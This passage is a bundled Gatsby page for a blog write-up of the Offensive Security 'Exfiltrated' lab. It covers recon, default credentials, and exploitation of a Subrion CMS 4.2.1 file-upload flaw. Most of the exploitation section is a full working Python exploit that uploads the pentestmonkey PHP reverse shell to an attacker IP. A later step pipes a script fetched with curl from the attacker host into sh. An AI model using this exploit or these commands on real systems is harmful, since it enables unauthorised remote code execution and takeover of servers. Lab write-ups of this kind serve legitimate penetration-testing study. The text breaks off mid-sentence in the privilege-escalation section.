"use strict";(self.webpackChunkminimal_blog=self.webpackChunkminimal_blog||[]).push([[570],{4765:function(e,n,t){t.d(n,{F:function(){return d},Z:function(){return g}});var a=t(7294),l=t(8733),i=t(795),r=t(8377),s=t(6799),o=t(8871);var c=e=>{let{post:n}=e;return null};const p=["16px","8px","4px"].map((e=>`rgba(0, 0, 0, 0.1) 0px ${e} ${e} 0px`));var m=e=>{let{data:{post:n},children:t}=e;return(0,l.tZ)(r.Z,null,(0,l.tZ)(i.X6,{as:"h1",variant:"styles.h1"},n.title),(0,l.tZ)("p",{sx:{color:"secondary",mt:3,a:{color:"secondary"},fontSize:[1,1,2]}},(0,l.tZ)("time",null,n.date),n.tags&&(0,l.tZ)(a.Fragment,null," — ",(0,l.tZ)(s.Z,{tags:n.tags})),n.timeToRead&&" — ",n.timeToRead&&(0,l.tZ)("span",null,n.timeToRead," min read")),(0,l.tZ)("section",{sx:{my:5,".gatsby-resp-image-wrapper":{my:[4,4,5],borderRadius:"4px",boxShadow:p.join(", "),".gatsby-resp-image-image":{borderRadius:"4px"}},variant:"layout.content"}},t),(0,l.tZ)(c,{post:n}))};const d=e=>{var n,t,a;let{data:{post:i}}=e;return(0,l.tZ)(o.Z,{title:i.title,description:i.description?i.description:i.excerpt,image:i.banner?null===(n=i.banner)||void 0===n||null===(t=n.childImageSharp)||void 0===t||null===(a=t.resize)||void 0===a?void 0:a.src:void 0,pathname:i.slug,canonicalUrl:i.canonicalUrl})};function g(e){let{...n}=e;return a.createElement(m,n)}},6799:function(e,n,t){var a=t(8733),l=t(7294),i=t(1883),r=t(3494),s=t(9706);n.Z=e=>{let{tags:n}=e;const{tagsPath:t,basePath:o}=(0,r.Z)();return(0,a.tZ)(l.Fragment,null,n.map(((e,n)=>(0,a.tZ)(l.Fragment,{key:e.slug},!!n&&", ",(0,a.tZ)(i.Link,{sx:e=>{var n;return{...null===(n=e.styles)||void 0===n?void 0:n.a}},to:(0,s.Z)(`/${o}/${t}/${e.slug}`)},e.name)))))}},8871:function(e,n,t){var a=t(7294),l=t(1883),i=t(4232);n.Z=e=>{let{title:n="",description:t="",pathname:r="",image:s="",children:o=null,canonicalUrl:c=""}=e;const p=(0,i.Z)(),{siteTitle:m,siteTitleAlt:d,siteUrl:g,siteDescription:u,siteImage:h,author:f,siteLanguage:A}=p,b={title:n?`${n} | ${m}`:d,description:t||u,url:`${g}${r||""}`,image:`${g}${s||h}`};return a.createElement(a.Fragment,null,a.createElement("html",{lang:A}),a.createElement("title",null,b.title),a.createElement("meta",{name:"description",content:b.description}),a.createElement("meta",{name:"image",content:b.image}),a.createElement("meta",{property:"og:title",content:b.title}),a.createElement("meta",{property:"og:url",content:b.url}),a.createElement("meta",{property:"og:description",content:b.description}),a.createElement("meta",{property:"og:image",content:b.image}),a.createElement("meta",{property:"og:type",content:"website"}),a.createElement("meta",{property:"og:image:alt",content:b.description}),a.createElement("meta",{name:"twitter:card",content:"summary_large_image"}),a.createElement("meta",{name:"twitter:title",content:b.title}),a.createElement("meta",{name:"twitter:url",content:b.url}),a.createElement("meta",{name:"twitter:description",content:b.description}),a.createElement("meta",{name:"twitter:image",content:b.image}),a.createElement("meta",{name:"twitter:image:alt",content:b.description}),a.createElement("meta",{name:"twitter:creator",content:f}),a.createElement("meta",{name:"gatsby-theme",content:"@lekoarts/gatsby-theme-minimal-blog"}),a.createElement("link",{rel:"icon",type:"image/png",sizes:"32x32",href:(0,l.withPrefix)("/favicon-32x32.png")}),a.createElement("link",{rel:"icon",type:"image/png",sizes:"16x16",href:(0,l.withPrefix)("/favicon-16x16.png")}),a.createElement("link",{rel:"apple-touch-icon",sizes:"180x180",href:(0,l.withPrefix)("/apple-touch-icon.png")}),c?a.createElement("link",{rel:"canonical",href:c}):null,o)}},2923:function(e,n,t){t.r(n),t.d(n,{Head:function(){return s.F},default:function(){return o}});var a=t(7294),l=t(1151);function i(e){const n=Object.assign({span:"span",h1:"h1",p:"p",code:"code",pre:"pre",h2:"h2",ul:"ul",li:"li",strong:"strong",a:"a",h3:"h3",h4:"h4"},(0,l.ah)(),e.components);return a.createElement(a.Fragment,null,a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 930px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 22.083333333333332%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAABYlAAAWJQFJUiTwAAAA5UlEQVR42h2NWXKCQBRFWYJGQTMAIgGaoZlBATUkWqay/wWd0P1x6k333mc02YXb6ZcqmUj8VpMFPWP74NI9mYc/6kUjvJoyHrn2T4b6Tnxs6ItZz0rbypveGVU2MvUPirgn8grEsURGHX155Vx/MXU/5KIj9ivK5MzYfTO0M2nQUMtx0cyL/06TT8uuxvBcG5kKwkCQpRIRCl73b8gsJ5eFrm3T4dguH+82ruOxXr2w3ZiLNta+9WqDubWwzB1GFjmcmoSD6xOFEf7xUx9c56BRQQfXY2ftNeqZClOoB+quehWo+AclrXZ/mGyoAQAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="info"\n        title=""\n        src="/static/a733c7d12315c4b773e58238a8d50e37/84841/info.png"\n        srcset="/static/a733c7d12315c4b773e58238a8d50e37/5243c/info.png 240w,\n/static/a733c7d12315c4b773e58238a8d50e37/ab158/info.png 480w,\n/static/a733c7d12315c4b773e58238a8d50e37/84841/info.png 930w"\n        sizes="(max-width: 930px) 100vw, 930px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}}),"\n",a.createElement(n.h1,null,"Recon"),"\n",a.createElement(n.p,null,a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 806px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 28.333333333333332%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAABYlAAAWJQFJUiTwAAABAUlEQVR42o2PTU+DQBCG+ZGejF5MbIsF2vK1dGFZoFDASutHGhMv3jzpb3yd2USrtQcPz05mZvfNs9bZ+QUux3MEao2sGSDKDqFqMFosfyBNHfvyAPdEkNVIyt68c4WG9f72gJnvQVQDmmGPcvOIvLuHm5QHREGUuIn0N3agYPspnFjDSwoT5tDc+ngVqNQInmwQ6RY+2cVFZ2y5RkRas3kPO1QUlv+CZ19wb125Ma4XKUIKy9ZbeMvKLB2yYtu46DElC+6Pw05h8cVJkJHFHdrdMzR9l614fvv0gnq7R0XBKRlPThj+CeSDA/m7qt2Zh3K1MUtFxnO5IsMc03/YceAnYT8h2TxWHZYAAAAASUVORK5CYII=\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="info-comm"\n        title=""\n        src="/static/193b65a1bfab4e46a42558eb16df6230/3c0d4/info-comm.png"\n        srcset="/static/193b65a1bfab4e46a42558eb16df6230/5243c/info-comm.png 240w,\n/static/193b65a1bfab4e46a42558eb16df6230/ab158/info-comm.png 480w,\n/static/193b65a1bfab4e46a42558eb16df6230/3c0d4/info-comm.png 806w"\n        sizes="(max-width: 806px) 100vw, 806px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}}),"\nThis machine has a Linux OS and is rated intermediate by the community."),"\n",a.createElement(n.p,null,"Remember to make an entry for the IP in ",a.createElement(n.code,null,"/etc/hosts")," file."),"\n",a.createElement(n.pre,null,a.createElement(n.code,null,"192.168.199.163 exfiltrated.offsec\n")),"\n",a.createElement(n.h2,null,"Nmap"),"\n",a.createElement(n.pre,null,a.createElement(n.code,null,"nmap -p- --open -sC -sV exfiltrated.offsec\n")),"\n",a.createElement(n.ul,null,"\n",a.createElement(n.li,null,a.createElement(n.code,null,"-p-"),": Scans all 65535 ports on the target system. The hyphen signifies scanning all possible ports."),"\n",a.createElement(n.li,null,a.createElement(n.code,null,"--open"),": Displays only open ports, indicating which services are active and accessible."),"\n",a.createElement(n.li,null,a.createElement(n.code,null,"-sC"),": Performs default script scanning, which runs a set of scripts to gather additional information about the target."),"\n",a.createElement(n.li,null,a.createElement(n.code,null,"-sV"),": Enables version detection, providing information about the versions of services running on open ports.\n",a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 30%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAABYlAAAWJQFJUiTwAAAA/klEQVR42n2R6U7DMBCE8yhADxpyO3Yc567TBERp3/9tht1thVCF+LFaH9rPM+PAdQtMfUTTr9Iz1eI4f6HQPcLIIM5qvCUVkrzBQfZOzqPE0plDnDpEqcX2tcDzNkUQpTW68UOAuppkUJkBSg/ygLYTymqUMrTmO9t47A6Kqrh1gm32OV52GYK87NCQym54xzSf0fbU/Rmj/ySlvF9xWq9yx2WdFwes9GmTCOR3BWx5ouF+uqskFX65CNCfLqRmFmUM4sdvFmsBPsIEyBbm5SqDueqQFa3Y4jUDOEvOKoyN2OKc/gL9APU9G/OQVUnQouxFMWfJn8Mftg/Lf6HfejfA6FnTiiMAAAAASUVORK5CYII=\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="nmap"\n        title=""\n        src="/static/65f8c68ef1d48c4bc0586ce68e045335/7d769/nmap.png"\n        srcset="/static/65f8c68ef1d48c4bc0586ce68e045335/5243c/nmap.png 240w,\n/static/65f8c68ef1d48c4bc0586ce68e045335/ab158/nmap.png 480w,\n/static/65f8c68ef1d48c4bc0586ce68e045335/7d769/nmap.png 960w,\n/static/65f8c68ef1d48c4bc0586ce68e045335/15588/nmap.png 1306w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}})),"\n"),"\n",a.createElement(n.p,null,"The ",a.createElement(n.code,null,"http-robots.txt")," found an admin panel at ",a.createElement(n.code,null,"/panel/")),"\n",a.createElement(n.ul,null,"\n",a.createElement(n.li,null,"we can log in to the panel using ",a.createElement(n.code,null,"admin:admin")),"\n",a.createElement(n.li,null,"however, notice that the application is ",a.createElement(n.strong,null,a.createElement(n.strong,null,"Powered by Subrion CMS v4.2.1"))),"\n"),"\n",a.createElement(n.h2,null,"Searchsploit"),"\n",a.createElement(n.p,null,"Running searchsploit for this shows the following\n",a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 22.083333333333332%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAABYlAAAWJQFJUiTwAAAAyElEQVR42j2QWQ6CQBBEuYbGL2UTZJsFWQTE0WjUaIzx/kcp2wb8qLzpTqaq0pajetjlHa42SGSNOKsQRDnctRgl//JGub5gOkTby5jTbLWhwiHSyAOJON5C5h2Easm4hh9qeIEiquE9Gvq0K6ojdNFD6pZLTEHWa77EZ7bEfuGgoIaduaPpLujNjc2jtPzr92HlJNzWnB64XN84np8oasN7201hdZTebyiRqKmZoMRU7pCpZpBsxhNQu2CS4jBuSEzFjve/E30BJd1+pI2tb6wAAAAASUVORK5CYII=\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="searchsploit"\n        title=""\n        src="/static/75b52172486671e58c3973243f329c71/7d769/searchsploit.png"\n        srcset="/static/75b52172486671e58c3973243f329c71/5243c/searchsploit.png 240w,\n/static/75b52172486671e58c3973243f329c71/ab158/searchsploit.png 480w,\n/static/75b52172486671e58c3973243f329c71/7d769/searchsploit.png 960w,\n/static/75b52172486671e58c3973243f329c71/87339/searchsploit.png 1440w,\n/static/75b52172486671e58c3973243f329c71/5409c/searchsploit.png 1664w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}})),"\n",a.createElement(n.p,null,"In a sea of txt files, I like to look at python files first"),"\n",a.createElement(n.ul,null,"\n",a.createElement(n.li,null,"this shows an arbitrary file upload"),"\n",a.createElement(n.li,null,"download the script using ",a.createElement(n.code,null,"searchsploit -m php/webapps/49876.py")),"\n"),"\n",a.createElement(n.h1,null,"Exploitation"),"\n",a.createElement(n.p,null,"From reading the script, we need to use the flags ",a.createElement(n.code,null,"-u")," ",a.createElement(n.code,null,"-l")," and ",a.createElement(n.code,null,"-p"),"\n",a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 35.416666666666664%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAABYlAAAWJQFJUiTwAAABD0lEQVR42nWRaXaDMBCDOUobQkIA4wWzY8jStL3/hdSZSUmbLj/0jJ89nyURpTagaC/o5zeE5R3KjvDtEf10RT++oOnP8N0RLa2uWVC3J2Rli0J3iBONzQ9Fxo2YwhVVPctFZXqUBHW0Z1X1Ak13nJ9hfUC8M9hsSzzF6hdMgDw0hle0wwUdiYdzRQ7KDjk9UNpB3PBDfJakTgYF/BeQL3E8jtZRRFNNyAjIq3aTANjNqmdy958EqMxw64l6a7rTXRX1xe75wd2hEnCSWtF270j2c//1za4FaKsATb1xd4ZcMWifeQEd8hpZ0Uj8NXqh+/vKM0r2A9LcI+KiuSce+D609nf7SYNAHyPqh6hr5A8wVdoY95N08QAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="run"\n        title=""\n        src="/static/379f7b233e6361cdf8b7cfd96c797687/7d769/run.png"\n        srcset="/static/379f7b233e6361cdf8b7cfd96c797687/5243c/run.png 240w,\n/static/379f7b233e6361cdf8b7cfd96c797687/ab158/run.png 480w,\n/static/379f7b233e6361cdf8b7cfd96c797687/7d769/run.png 960w,\n/static/379f7b233e6361cdf8b7cfd96c797687/87339/run.png 1440w,\n/static/379f7b233e6361cdf8b7cfd96c797687/979dd/run.png 1442w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}})),"\n",a.createElement(n.p,null,"The script found in searchsploit gives us local access on Exfiltrated as the user ",a.createElement(n.code,null,"www-data")),"\n",a.createElement(n.ul,null,"\n",a.createElement(n.li,null,"However, the script is a webshell and it makes requests to the shell using a command that we enter"),"\n",a.createElement(n.li,null,"In order to get a fully functional reverse shell, we can manipulate the script to upload a reverse shell"),"\n"),"\n",a.createElement(n.p,null,"The main changes are as follows:"),"\n",a.createElement(n.ul,null,"\n",a.createElement(n.li,null,"I will use another process (",a.createElement(n.code,null,"import subprocess"),") to create a netcat reverse shell so only one script needs to be run."),"\n",a.createElement(n.li,null,"URL is hardcoded to ",a.createElement(n.code,null,"http://exfiltrated.offsec/panel"),". This simplifies the script so it does not need any flags, so make sure that the ip is set in ",a.createElement(n.code,null,"/etc/hosts")," file"),"\n",a.createElement(n.li,null,"The ",a.createElement(n.code,null,"shell_upload()")," function replaced the old php webshell file with a reverse shell"),"\n",a.createElement(n.li,null,"I will use the following php reverse shell from ",a.createElement(n.a,{href:"https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php"},"pentestmonkey")," and save it in a ",a.createElement(n.code,null,".phar")," extension to evade any php file extension blacklists if there are any"),"\n"),"\n",a.createElement(n.p,null,a.createElement(n.strong,null,"The full script is below:")),"\n",a.createElement(n.ul,null,"\n",a.createElement(n.li,null,"change the IP in the php reverse shell to point to your host"),"\n"),"\n",a.createElement(n.pre,null,a.createElement(n.code,null,'#!/usr/bin/python3\n\nimport requests\nimport time\nimport random\nimport string\nfrom bs4 import BeautifulSoup\nimport subprocess\n\nurl = "http://exfiltrated.offsec/panel/"\nurl_upload = url + \'uploads/read.json\'\nurl_shell = url + \'uploads/\'\nusername = "admin"\npassword = "admin"\nnetcat_port = 1234\n\nsession = requests.Session()\n\ndef login():\n    global csrfToken\n    print(\'[+] Trying to connect to: \' + url)\n\n    try:\n        get_token_request = session.get(url)\n        soup = BeautifulSoup(get_token_request.text, \'html.parser\')\n\n        csrfToken = soup.find(\'input\', attrs={\'name\': \'__st\'})[\'value\']\n        print(\'[+] Success!\')\n        time.sleep(1)\n\n        if csrfToken:\n            print(f"[+] Got CSRF token: {csrfToken}")\n            print("[+] Trying to log in...")\n\n            auth_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5",\n                            "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://exfiltrated.offsec", "Connection": "close", "Referer": "http://exfiltrated.offsec/login/", "Upgrade-Insecure-Requests": "1"}\n            auth_data = {"__st": csrfToken, "username": username, "password": password}\n            auth = session.post(url, headers=auth_headers, data=auth_data)\n            if len(auth.text) <= 7000:\n                    print(\'\\n[x] Login failed... Check credentials\')\n                    exit()\n            else:\n                    print(\'[+] Login Successful!\\n\')\n        else:\n            print(\'[x] Failed to got CSRF token\')\n            exit()\n\n    except requests.exceptions.ConnectionError as err:\n        print(\'\\n[x] Failed to Connect in: \'+url+\' \')\n        print(\'[x] This host seems to be Down\')\n        exit()\n\n    return csrfToken\n\ndef name_rnd():\n    global shell_name\n    print(\'[+] Generating random name for Webshell...\')\n    shell_name = \'\'.join((random.choice(string.ascii_lowercase)\n                         for x in range(15)))\n    time.sleep(1)\n    print(\'[+] Generated webshell name: \'+shell_name+\'\\n\')\n\n    return shell_name\n         \ndef shell_upload():\n    print(\'[+] Trying to Upload Webshell..\')\n    try:\n        up_url = url_upload\n        up_headers = {\n            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",\n            "Accept": "*/*",\n            "Accept-Language": "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3",\n            "Accept-Encoding": "gzip, deflate",\n            "Content-Type": "multipart/form-data; boundary=---------------------------870492933289164732357145027",\n            "Origin": "http://exfiltrated.offsec",\n            "Connection": "close",\n            "Referer": "http://exfiltrated.offsec/panel/uploads/"\n        }\n        up_data = """-----------------------------870492933289164732357145027\nContent-Disposition: form-data; name="reqid"\n\n18c48efa225203\n-----------------------------870492933289164732357145027\nContent-Disposition: form-data; name="cmd"\n\nupload\n-----------------------------870492933289164732357145027\nContent-Disposition: form-data; name="target"\n\nl1_Lw\n-----------------------------870492933289164732357145027\nContent-Disposition: form-data; name="__st"\n\n"""+csrfToken+"""\n-----------------------------870492933289164732357145027\nContent-Disposition: form-data; name="upload[]"; filename=\\""""+shell_name+""".phar"\nContent-Type: application/octet-stream\n\n<?php\n// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php\n// Copyright (C) 2007 pentestmonkey@pentestmonkey.net\n\nset_time_limit (0);\n$VERSION = "1.0";\n$ip = \'192.168.45.185\'; // CHANGE THIS\n$port = 1234;\n$chunk_size = 1400;\n$write_a = null;\n$error_a = null;\n$shell = \'uname -a; w; id; sh -i\';\n$daemon = 0;\n$debug = 0;\n\nif (function_exists(\'pcntl_fork\')) {\n\t$pid = pcntl_fork();\n\t\n\tif ($pid == -1) {\n\t\tprintit("ERROR: Can\'t fork");\n\t\texit(1);\n\t}\n\t\n\tif ($pid) {\n\t\texit(0);  // Parent exits\n\t}\n\tif (posix_setsid() == -1) {\n\t\tprintit("Error: Can\'t setsid()");\n\t\texit(1);\n\t}\n\n\t$daemon = 1;\n} else {\n\tprintit("WARNING: Failed to daemonise.  This is quite common and not fatal.");\n}\n\nchdir("/");\n\numask(0);\n\n// Open reverse connection\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\nif (!$sock) {\n\tprintit("$errstr ($errno)");\n\texit(1);\n}\n\n$descriptorspec = array(\n   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from\n   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to\n   2 => array("pipe", "w")   // stderr is a pipe that the child will write to\n);\n\n$process = proc_open($shell, $descriptorspec, $pipes);\n\nif (!is_resource($process)) {\n\tprintit("ERROR: Can\'t spawn shell");\n\texit(1);\n}\n\nstream_set_blocking($pipes[0], 0);\nstream_set_blocking($pipes[1], 0);\nstream_set_blocking($pipes[2], 0);\nstream_set_blocking($sock, 0);\n\nprintit("Successfully opened reverse shell to $ip:$port");\n\nwhile (1) {\n\tif (feof($sock)) {\n\t\tprintit("ERROR: Shell connection terminated");\n\t\tbreak;\n\t}\n\n\tif (feof($pipes[1])) {\n\t\tprintit("ERROR: Shell process terminated");\n\t\tbreak;\n\t}\n\n\t$read_a = array($sock, $pipes[1], $pipes[2]);\n\t$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n\n\tif (in_array($sock, $read_a)) {\n\t\tif ($debug) printit("SOCK READ");\n\t\t$input = fread($sock, $chunk_size);\n\t\tif ($debug) printit("SOCK: $input");\n\t\tfwrite($pipes[0], $input);\n\t}\n\n\tif (in_array($pipes[1], $read_a)) {\n\t\tif ($debug) printit("STDOUT READ");\n\t\t$input = fread($pipes[1], $chunk_size);\n\t\tif ($debug) printit("STDOUT: $input");\n\t\tfwrite($sock, $input);\n\t}\n\n\tif (in_array($pipes[2], $read_a)) {\n\t\tif ($debug) printit("STDERR READ");\n\t\t$input = fread($pipes[2], $chunk_size);\n\t\tif ($debug) printit("STDERR: $input");\n\t\tfwrite($sock, $input);\n\t}\n}\n\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\n\nfunction printit ($string) {\n\tif (!$daemon) {\n\t\tprint "$string\\n";\n\t}\n}\n\n?>\n\n-----------------------------870492933289164732357145027\nContent-Disposition: form-data; name="mtime[]"\n\n1702030664\n-----------------------------870492933289164732357145027--"""\n        res = session.post(up_url, headers=up_headers, data=up_data)\n        if "error" in res.text:\n             print(\'[x] Shell upload failure: \'+url_upload+\' \')\n        else:\n            print(\'[x] Shell upload success: \'+url_upload+\' \')\n\n    except requests.exceptions.HTTPError as conn:\n        print(\'[x] Failed to Upload Webshell in: \'+url_upload+\' \')\n        exit()\n\ndef code_exec():\n    auth_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5",\n                            "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://exfiltrated.offsec", "Connection": "close", "Referer": "http://exfiltrated.offsec/login/", "Upgrade-Insecure-Requests": "1"}\n    shell_url = "http://exfiltrated.offsec/uploads/"+shell_name+".phar"\n    req = session.get(shell_url, headers=auth_headers)\n\nlogin()\nname_rnd()\nshell_upload()\nsubprocess.Popen(f"nc -nvlp {netcat_port}", shell=True)\ncode_exec()\n')),"\n",a.createElement(n.p,null,"I saved this code in a file called ",a.createElement(n.code,null,"poc.py")," and ran it with ",a.createElement(n.code,null,"python3 poc.py"),"\n",a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 38.75%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAABYlAAAWJQFJUiTwAAABKUlEQVR42o2R226DMBBE+ZJeEggJF4O5Y7ChTQJppVZF+f9vma63UfrUpA9H45Xl2d2xczAz3scJH2YPkTRIsh4pkWQdk+Y9ZK6x2eV4dgVWXnITpx9PqNQeshrYzJrEaUsoNmPDQiOIq/8Z1u0rKkL1Rwgy2UUlhFQIRc0Gj6uIeVrHXN8zdXKaLCsNimZEQWeLXTErDJu6voRHuBe8LekmvbHyMKPtDtDDCS1NafMLRcNrR6SJ/I3ATh5Rzn7wd55OZyZ0eoLSRzSUZU1Ynd8W2DvbsKdmVu1dEFWUZ03G7UUbbiyo6TYs4ZSUX16PyKuRH0haNSWsSUuNiublOllMJnbdNeH6P7q+1pLVOesRX6onNJZO46wH1oVrg89aQQUJHvhj7v/yNyT3+7uuKKrvAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="poc"\n        title=""\n        src="/static/4be2af6363f34c1d52f115b3665bcf83/7d769/poc.png"\n        srcset="/static/4be2af6363f34c1d52f115b3665bcf83/5243c/poc.png 240w,\n/static/4be2af6363f34c1d52f115b3665bcf83/ab158/poc.png 480w,\n/static/4be2af6363f34c1d52f115b3665bcf83/7d769/poc.png 960w,\n/static/4be2af6363f34c1d52f115b3665bcf83/87339/poc.png 1440w,\n/static/4be2af6363f34c1d52f115b3665bcf83/af50b/poc.png 1580w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}})),"\n",a.createElement(n.p,null,"To get a fully functional shell follow the commands below"),"\n",a.createElement(n.pre,null,a.createElement(n.code,null,"python3 -c ‘import pty;pty.spawn(“/bin/bash”);’\nexport TERM=xterm\nCtrl + z\nstty raw -echo ; fg\nreset\n")),"\n",a.createElement(n.h2,null,"Privilege Escalation"),"\n",a.createElement(n.p,null,"To assess the attack surface, run ",a.createElement(n.code,null,"linpeas.sh")," on the target:"),"\n",a.createElement(n.ul,null,"\n",a.createElement(n.li,null,"run a python http server in the directory with the ",a.createElement(n.code,null,"linpeas.sh")," file with ",a.createElement(n.code,null,"python3 -m http.server 80")),"\n",a.createElement(n.li,null,"then use the ",a.createElement(n.code,null,"curl")," command with ",a.createElement(n.code,null,"sh")," to run the script on the target machine"),"\n",a.createElement(n.li,null,"the IP specified is downloading from my Kali host"),"\n"),"\n",a.createElement(n.pre,null,a.createElement(n.code,null,"curl http://192.168.45.185/linpeas.sh | sh\n")),"\n",a.createElement(n.h3,null,"Linpeas Results"),"\n",a.createElement(n.p,null,"From the scan results, we can see a cronjob is running.\n",a.createElement(n.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 17.5%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAABYlAAAWJQFJUiTwAAAA30lEQVR42k2QQVeDMBCE+RsePCBYSiAkBCgkQEppraYefP7/HzOO4MHDvm822Tf7diJtA5QZkWuLoupRqgFx6ZHLAZJalCeUFSl//ywy0SJOK7y8qo1xqv5q15GgiTwatIlETl3RXBoP3XrI2qEmtZmgmwmm8xvTzCA5aLLe+U9HJQcabrs8Jaiph36BswvWNeC6PnBePjajk11hxxsm/45xvnN2hl8Cer67+Q3+Esg7ooKnKhqOzwdcO4dP5/FgfS83fPkVYZggRIOs6Hh2t8fCCI7spXZ7FOwlfaSy+AFL83+oEfFWYQAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="cronjob"\n        title=""\n        src="/static/270985c6868938960882ff969e007040/7d769/cronjob.png"\n        srcset="/static/270985c6868938960882ff969e007040/5243c/cronjob.png 240w,\n/static/270985c6868938960882ff969e007040/ab158/cronjob.png 480w,\n/static/270985c6868938960882ff969e007040/7d769/cronjob.png 960w,\n/static/270985c6868938960882ff969e007040/87339/cronjob.png 1440w,\n/static/270985c6868938960882ff969e007040/aa928/cronjob.png 1490w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}})),"\n",a.createElement(n.p,null,"Reading the script ",a.createElement(n.code,null,"image-exif.sh")," in the ",a.createElement(n.code,null,"/opt")," 